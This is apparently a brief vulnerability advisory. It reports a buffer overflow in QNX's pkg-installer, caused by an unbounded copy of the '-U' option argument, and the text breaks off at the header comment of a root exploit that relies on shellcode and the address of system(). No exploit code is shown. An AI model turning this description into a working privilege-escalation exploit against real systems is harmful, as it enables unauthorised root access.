It has been reported that the pkg-installer utility for QNX is vulnerable to a buffer overflow condition.

The vulnerability is a result of an unbounded string copy of the argument to the "-U" commandline option of pkg-installer to a local buffer.

/* Quick and dirty QNX pkg-installer root exploit.
 * The shellcode sucks, it is longer than it has
 * to be and you need the address to system() for
 * it to work. Yes I know I'm lazy....
